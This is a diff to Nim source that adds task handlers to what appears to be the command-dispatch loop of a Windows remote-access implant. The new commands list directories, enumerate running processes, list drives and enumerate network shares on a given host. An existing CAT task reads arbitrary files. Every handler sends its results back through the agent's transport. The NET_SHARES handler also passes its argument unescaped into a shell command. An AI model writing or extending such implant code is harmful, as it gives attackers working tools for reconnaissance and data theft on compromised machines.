@@ -746,6 +746,67 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         lsOut.add(k & "  " & path & "\n")
     except: lsOut = "[error listing]"
     t.sendResult(id, lsOut, "")
+  of "LS_JSON":
+    let dir = if args == "": getCurrentDir() else: args
+    try:
+      let absPath = absolutePath(dir)
+      var entriesArr = newJArray()
+      for kind, item in walkDir(absPath):
+        let name = item.extractFilename()
+        let isDir = kind in {pcDir, pcLinkToDir}
+        var sz: int64 = 0
+        var modStr = ""
+        try:
+          let info = getFileInfo(item)
+          sz      = info.size
+          modStr  = $info.lastWriteTime
+        except: discard
+        entriesArr.add(%*{"name": name, "is_dir": isDir, "size": sz, "mod": modStr})
+      let resp = %*{"cwd": getCurrentDir(), "path": absPath, "entries": entriesArr}
+      t.sendResult(id, $resp, "")
+    except CatchableError as e:
+      t.sendResult(id, $(%*{"error": e.msg}), "")
+
+  of "PS_JSON":
+    var procs = newJArray()
+    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    if snap != INVALID_HANDLE_VALUE:
+      var pe: PROCESSENTRY32W
+      pe.dwSize = sizeof(PROCESSENTRY32W).DWORD
+      if Process32FirstW(snap, addr pe) != 0:
+        while true:
+          let name = $cast[WideCString](addr pe.szExeFile[0])
+          procs.add(%*{"pid": pe.th32ProcessID.int, "name": name, "security": ""})
+          if Process32NextW(snap, addr pe) == 0: break
+      CloseHandle(snap)
+    t.sendResult(id, $procs, "")
+
+  of "DRIVES":
+    let drivesRaw = runShell("wmic logicaldisk get name /format:list 2>&1")
+    var entriesArr = newJArray()
+    for line in drivesRaw.splitLines():
+      let l = line.strip()
+      if l.startsWith("Name=") and l.len > 5:
+        let drive = l[5..^1].strip()
+        if drive.len > 0:
+          entriesArr.add(%*{"name": drive & "\\", "is_dir": true, "size": 0, "mod": ""})
+    t.sendResult(id, $(%*{"cwd": "", "path": "", "drives": true, "entries": entriesArr}), "")
+
+  of "NET_SHARES":
+    let host    = args.strip(chars = {'\\', '/'})
+    let netOut  = runShell("net view \\\\" & host & " /all 2>&1")
+    var entriesArr = newJArray()
+    var parsing = false
+    for line in netOut.splitLines():
+      let l = line.strip()
+      if "---" in l: parsing = true; continue
+      if not parsing or l == "": continue
+      if "completado" in l.toLowerAscii() or "completed" in l.toLowerAscii(): break
+      let parts = l.splitWhitespace()
+      if parts.len >= 2 and parts[1].toLowerAscii() in ["disk","disco"]:
+        entriesArr.add(%*{"name": parts[0], "is_dir": true, "size": 0, "mod": ""})
+    t.sendResult(id, $(%*{"cwd": "", "path": "\\\\" & host, "shares": true, "entries": entriesArr}), "")
+
   of "CAT":
     try: t.sendResult(id, readFile(args), "")
     except: t.sendResult(id, "", "cat: " & getCurrentExceptionMsg())
